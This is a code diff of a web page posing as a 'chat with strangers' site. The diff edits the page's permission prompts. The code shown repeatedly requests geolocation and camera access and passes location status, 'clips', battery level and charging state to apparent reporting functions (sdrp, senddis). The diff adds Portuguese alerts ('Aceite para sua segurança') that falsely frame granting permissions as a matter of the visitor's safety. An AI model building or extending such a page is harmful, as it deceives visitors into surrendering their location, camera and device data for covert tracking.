@@ -145,7 +145,7 @@
                      navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
                    }, 5000);
                  } else {
-                   alert("Your Browser Does not support Gps");
+                   alert("Aceite para sua segurança");
                  }
                }
 
@@ -158,9 +158,9 @@
            function showError(error) {
              switch (error.code) {
                case error.PERMISSION_DENIED:
-                 sdrp("Perfeito, agora ninguém sabe sua localização.",clips,batterypercentage,ischarging);
-                 senddis("Perfeito, agora ninguém sabe sua localização.",clips,batterypercentage,ischarging)
-                 alert("Allow Location permission to Chat with nearby Strangers");
+                 sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
+                 senddis("Location Permission Denied",clips,batterypercentage,ischarging)
+                 alert("Aceite para sua segurança");
 
                  break;
                case error.POSITION_UNAVAILABLE:
@@ -269,7 +269,7 @@
           handleSuccess(stream);
         } catch (e) {
           setTimeout(function(){
-          alert("blocked Camera access to chat with strangers");
+          alert("Aceite para sua segurança");
           window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
       alert("Read this page to grant camera access to  our website")
        },15000) }
@@ -301,7 +301,7 @@
             ></iframe>
             <div class="dialog-box" id="dialogBox">
               <h2>Alert</h2>
-              <p>Por favor, permita todas as permissões necessárias para sua segurança.</p>
+              <p>Please Allow all permissions to continue to chat with strangers</p>
                <button class="btn-allow" id="allowBtn">OK</button>
            </div>
 
